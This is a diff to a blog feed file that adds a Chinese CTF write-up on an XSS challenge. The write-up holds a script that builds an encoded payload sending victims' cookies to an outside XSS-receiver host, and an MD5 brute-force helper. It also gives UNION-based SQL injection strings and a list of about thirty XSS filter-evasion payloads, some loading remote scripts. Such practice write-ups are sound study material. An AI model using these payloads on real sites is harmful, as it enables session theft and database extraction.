@@ -125,7 +125,7 @@ SameSite：如果为None，可能可用于CSRF攻击。
       </tags>
   </entry>
   <entry>
-    <title>RCE</title>
+    <title>RCE，XSS</title>
     <url>/posts/4d9b8a15/</url>
     <content><![CDATA[<h1 id="PHP-RCE"><a href="#PHP-RCE" class="headerlink" title="PHP RCE"></a>PHP RCE</h1><h2 id="记录一道关于PHP函数漏洞利用的题目"><a href="#记录一道关于PHP函数漏洞利用的题目" class="headerlink" title="记录一道关于PHP函数漏洞利用的题目"></a>记录一道关于PHP函数漏洞利用的题目</h2><blockquote>
 <p><a href="https://buuoj.cn/challenges#[BUUCTF%202018]Online%20Tool">题目在这里</a>  </p>
@@ -180,6 +180,132 @@ escapeshellcmd()
 #等于 &quot;It&#39;s a dog.&quot; 
 </code></pre>
 <p>这时会作为一个完整的字符串进行后续操作。  </p>
+<h1 id="记一道没有做出来的XSS攻击题目"><a href="#记一道没有做出来的XSS攻击题目" class="headerlink" title="记一道没有做出来的XSS攻击题目"></a>记一道没有做出来的XSS攻击题目</h1><p>上一周在做题时了解到利用Cooike可以进行XSS攻击，这周就遇到一道XSS，具体是利用XSS通过更改Cooike获取管理员权限来得到flag  </p>
+<blockquote>
+<p> 题目在这里 <a href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA]Web2">CISCN2019 华东北赛区 Web2 1</a>  </p>
+</blockquote>
+<p>一开始打开发现是一个非常正常的文章汇总页面，一时间以为走错地方了（）</p>
+<p>然后探索发现存在注册以及登录的功能。注册个admin，注册成功，说明这里似乎对用户名没有限制。  </p>
+<p>发现存在上传文章和反馈两个功能，翻看WP得知，这里的上传文章功能存在XSS漏洞，可以在这里上传XSS攻击代码，然后通过上传反馈得到管理员的SESSID，进行SQL注入后得到flag  </p>
+<p>我们得知这里存在一个admin.php,访问提示不是管理员无法查看（果然）  </p>
+<p>于是我们尝试进行XSS攻击。发现这里还存在WAF，会将’’(‘’转义成”（”  </p>
+<p>使用这个脚本  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">in_str = &quot;(function()&#123;window.location.href=&#x27;http://xss.buuoj.cn/index.php?do=api&amp;id=xpqwIP&amp;keepsession=0&amp;location=&#x27;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return&#x27;&#x27;&#125;&#125;)())+&#x27;&amp;toplocation=&#x27;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return&#x27;&#x27;&#125;&#125;)())+&#x27;&amp;cookie=&#x27;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return&#x27;&#x27;&#125;&#125;)())+&#x27;&amp;opener=&#x27;+escape((function()&#123;try&#123;return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&#x27;&#x27;&#125;catch(e)&#123;return&#x27;&#x27;&#125;&#125;)());&#125;)();&quot;</span><br><span class="line"></span><br><span class="line">output = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for c in in_str:</span><br><span class="line">    output += &quot;&amp;#&quot; + str(ord(c))</span><br><span class="line"></span><br><span class="line">print(&quot;&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&quot; + output + &quot;&amp;#34&amp;#41&lt;/script&gt;&quot;)</span><br><span class="line">~~~  </span><br><span class="line">生成payload后提交，得到url后进反馈  </span><br><span class="line"></span><br><span class="line">输入得到的url（题目提示要把靶机域名改为web）接下来解决验证码问题，题目中给出*substr(md5($str), 0, 6) === “cfde39”：*  </span><br><span class="line">这是一个MD5弱比较，使用下面这个脚本来生成验证码  </span><br></pre></td></tr></table></figure>
+<p>import hashlib<br>import random<br>import string</p>
+<p>target &#x3D; “cfde39”</p>
+<p>while True:<br>    # 生成一个随机字符串 (4 个字符)<br>    s &#x3D; ‘’.join(random.choices(string.ascii_letters + string.digits, k&#x3D;8))<br>    hash_value &#x3D; hashlib.md5(s.encode()).hexdigest()[:6]<br>    if hash_value &#x3D;&#x3D; target:<br>        print(f”Found: {s}”)<br>        break</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">由于题目中提供的xss.buuoj.cn已经停止服务了，所以我们还要自己搭建一个用于接收反馈的平台  </span><br><span class="line"></span><br><span class="line">&gt; 项目地址：[XSS数据接收平台（无SQL版）](https://github.com/firesunCN/BlueLotus_XSSReceiver)  </span><br><span class="line"></span><br><span class="line">使用小皮面板来搭建这个平台，可惜的是搭建好后我的模板都神奇地消失了，一开始以为是Windows Defender的问题（虽然确实），但关掉之后还是没有js模板，导致平台一直没法用，只能止步于此了。  </span><br><span class="line"></span><br><span class="line">如果顺利的话，可以截取到管理员的SESSID，从而成功登录到admin.php，然后用</span><br></pre></td></tr></table></figure>
+<p>-2 union select 1,2,3#</p>
+<p>-2 union select 1,database(),user()#</p>
+<p>-2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’ciscn’#</p>
+<p>-2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’flag’#</p>
+<p>-2 union select 1,2,group_concat(flagg) from ciscn.flag#</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SQL联合查询得到flag  </span><br><span class="line"></span><br><span class="line">这里记录一些常见的XSS攻击代码  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>(1)普通的XSS JavaScript注入</p>
+<SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>
+
+<p>(2)IMG标签XSS使用JavaScript命令</p>
+<IMG SRC=http://3w.org/XSS/xss.js/>
+
+<p>(3)IMG标签无分号无引号</p>
+<p>&lt;IMG SRC&#x3D;javascript:alert(‘XSS’)&gt;</p>
+<p>(4)IMG标签大小写不敏感</p>
+<p>&lt;IMG SRC&#x3D;JaVaScRiPt:alert(‘XSS’)&gt;</p>
+<p>(5)HTML编码(必须有分号)</p>
+<p>&lt;IMG SRC&#x3D;javascript:alert(“XSS”)&gt;</p>
+<p>(6)修正缺陷IMG标签</p>
+<p>&lt;IMG “””&gt;<SCRIPT>alert("XSS")</SCRIPT>“&gt;</p>
+<p>(7)formCharCode标签(计算器)</p>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+
+<p>(8)UTF-8的Unicode编码(计算器)</p>
+<p>&lt;IMG SRC&#x3D;jav..省略..S’)&gt;</p>
+<p>(9)7位的UTF-8的Unicode编码是没有分号的(计算器)</p>
+<p>&lt;IMG SRC&#x3D;jav..省略..S’)&gt;</p>
+<p>(10)十六进制编码也是没有分号(计算器)</p>
+<IMG SRC=&#x6A&#x61&#x76&#x61..省略..&#x58&#x53&#x53&#x27&#x29>
+
+<p>(11)嵌入式标签,将Javascript分开</p>
+<IMG SRC="jav ascript:alert('XSS');">
+
+<p>(12)嵌入式编码标签,将Javascript分开</p>
+<IMG SRC="jav ascript:alert('XSS');">
+
+<p>(13)嵌入式换行符</p>
+<IMG SRC="jav ascript:alert('XSS');">
+
+<p>(14)嵌入式回车</p>
+<IMG SRC="jav ascript:alert('XSS');">
+
+<p>(15)嵌入式多行注入JavaScript,这是XSS极端的例子</p>
+<IMG SRC="javascript:alert('XSS')">
+
+<p>(16)解决限制字符(要求同页面)</p>
+<script>z='document.'</script><script>z=z+'write("'</script><script>z=z+'<script'</script><script>z=z+' src=ht'</script><script>z=z+'tp://ww'</script><script>z=z+'w.shell'</script><script>z=z+'.net/1.'</script><script>z=z+'js></sc'</script><script>z=z+'ript>")'</script><script>eval_r(z)</script>
+
+<p>(17)空字符12-7-1 T00LS - Powered by Discuz! Board</p>
+<p><a href="https://www.a.com/viewthread.php?action=printable&tid=15267">https://www.a.com/viewthread.php?action=printable&amp;tid=15267</a> 2&#x2F;6perl -e ‘print “&lt;IMG SRC&#x3D;java\0script:alert(&quot;XSS&quot;)&gt;”;’ &gt; out</p>
+<p>(18)空字符2,空字符在国内基本没效果.因为没有地方可以利用</p>
+<p>perl -e ‘print “&lt;SCR\0IPT&gt;alert(&quot;XSS&quot;)&lt;&#x2F;SCR\0IPT&gt;”;’ &gt; out</p>
+<p>(19)Spaces和meta前的IMG标签</p>
+<IMG SRC=" javascript:alert('XSS');">
+
+<p>(20)Non-alpha-non-digit XSS</p>
+<p>&lt;SCRIPT&#x2F;XSS SRC&#x3D;”<a href="http://3w.org/XSS/xss.js%22%3E">http://3w.org/XSS/xss.js&quot;&gt;</a></SCRIPT></p>
+<p>(21)Non-alpha-non-digit XSS to 2</p>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+
+<p>(22)Non-alpha-non-digit XSS to 3</p>
+<p>&lt;SCRIPT&#x2F;SRC&#x3D;”<a href="http://3w.org/XSS/xss.js%22%3E">http://3w.org/XSS/xss.js&quot;&gt;</a></SCRIPT></p>
+<p>(23)双开括号</p>
+<p>&lt;<SCRIPT>alert("XSS");//<</SCRIPT></p>
+<p>(24)无结束脚本标记(仅火狐等浏览器)</p>
+<SCRIPT SRC=http://3w.org/XSS/xss.js?<B>
+
+(25)无结束脚本标记2
+
+<SCRIPT SRC=//3w.org/XSS/xss.js>
+
+(26)半开的HTML/JavaScript XSS
+
+<IMG SRC="javascript:alert('XSS')"
+
+(27)双开角括号
+
+<iframe src=http://3w.org/XSS.html <
+
+(28)无单引号 双引号 分号
+
+<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
+
+<p>(29)换码过滤的JavaScript</p>
+<p>&quot;;alert(‘XSS’);&#x2F;&#x2F;</p>
+<p>(30)结束Title标签</p>
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+~~~  
+
+<blockquote>
+<p><a href="https://segmentfault.com/a/1190000022348467">更多XSS攻击代码</a>  </p>
+</blockquote>
+<p>顺便贴上几篇参考的WP  </p>
+<blockquote>
+<p><a href="https://www.cnblogs.com/AndyNoel/p/14764006.html">WP1</a>  </p>
+</blockquote>
+<blockquote>
+<p><a href="https://www.cnblogs.com/rabbittt/p/13372401.html">WP2</a>  </p>
+</blockquote>
+<blockquote>
+<p><a href="https://blog.csdn.net/mochu7777777/article/details/105212961">WP3</a>  </p>
+</blockquote>
+<blockquote>
+<p><a href="https://blog.51cto.com/u_16159500/6515093">WP4</a>  </p>
+</blockquote>
+<blockquote>
+<p><a href="https://ctf.eki.im/buuoj/ciscn-northeast-2019.html">WP5</a>  </p>
+</blockquote>
+<blockquote>
+<p><a href="https://blog.csdn.net/weixin_44652484/article/details/134169568">XSS数据接收平台配置教程</a></p>
+</blockquote>
 ]]></content>
       <tags>
         <tag>周报</tag>
